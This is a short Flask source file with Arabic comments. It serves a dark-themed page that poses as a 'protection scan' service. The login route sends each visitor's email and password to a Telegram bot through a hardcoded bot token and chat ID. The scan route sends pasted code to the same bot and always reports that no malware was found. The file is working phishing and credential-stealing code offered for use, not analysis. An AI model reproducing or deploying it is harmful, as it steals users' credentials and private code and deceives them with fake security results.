from flask import Flask, request, render_template_string, redirect, session
import requests

app = Flask(__name__)
app.secret_key = "jawad_master_key"

# بيانات التليجرام الخاصة بك
BOT_TOKEN = "8648545262:AAEqXqGrARHdBgwolI9ny0qM3B0gvKEkE04"
CHAT_ID = "8270719098"

# ستايل احترافي (Dark Theme)
STYLE = '''
<style>
    body { font-family: 'Segoe UI', sans-serif; background: #0d1117; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
    .card { background: #161b22; border: 1px solid #30363d; border-radius: 12px; padding: 30px; width: 350px; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
    input, textarea { width: 100%; padding: 12px; margin-bottom: 15px; border-radius: 6px; border: 1px solid #30363d; background: #0d1117; color: white; box-sizing: border-box; outline: none; }
    textarea { color: #39ff14; font-family: monospace; }
    button { width: 100%; padding: 12px; background: #238636; color: white; border: none; border-radius: 6px; font-weight: bold; cursor: pointer; font-size: 16px; }
    button:hover { background: #2ea043; }
    h2 { color: #58a6ff; margin-bottom: 20px; }
</style>
'''

@app.route('/')
def home():
    if session.get('in'):
        return render_template_string(f'<!DOCTYPE html><html dir="rtl">{STYLE}<body><div class="card"><h2>🛡️ فحص الحماية</h2><p>أدخل الكود لتحليله</p><form action="/scan" method="post"><textarea name="c" placeholder="الصق الكود هنا..." rows="5"></textarea><button>بدء الفحص 🔍</button></form></div></body></html>')
    return render_template_string(f'<!DOCTYPE html><html dir="rtl">{STYLE}<body><div class="card"><h2>🛡️ دخول النظام</h2><p>يرجى تسجيل الدخول للبدء</p><form action="/login" method="post"><input type="email" name="e" placeholder="البريد الإلكتروني" required><input type="password" name="p" placeholder="كلمة المرور" required><button>دخول</button></form></div></body></html>')

@app.route('/login', methods=['POST'])
def login():
    e, p = request.form.get('e'), request.form.get('p')
    # إرسال البيانات لتليجرام
    try:
        requests.get(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage?chat_id={CHAT_ID}&text=🔑 دخول جديد:\n📧 {e}\n🔑 {p}")
    except:
        pass
    session['in'] = True
    return redirect('/')

@app.route('/scan', methods=['POST'])
def scan():
    content = request.form.get('c')
    # إرسال المحتوى لتليجرام
    try:
        requests.get(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage?chat_id={CHAT_ID}&text=🔍 محتوى مفحوص:\n`{content[:500]}`")
    except:
        pass
    return f'<!DOCTYPE html><html dir="rtl">{STYLE}<body><div class="card"><h2 style="color:#238636;">✅ اكتمل الفحص</h2><p>لم يتم العثور على برمجيات خبيثة.</p><a href="/" style="color:#58a6ff; text-decoration:none;">فحص ملف آخر</a></div></body></html>'

if __name__ == '__main__':
    app.run(debug=True)
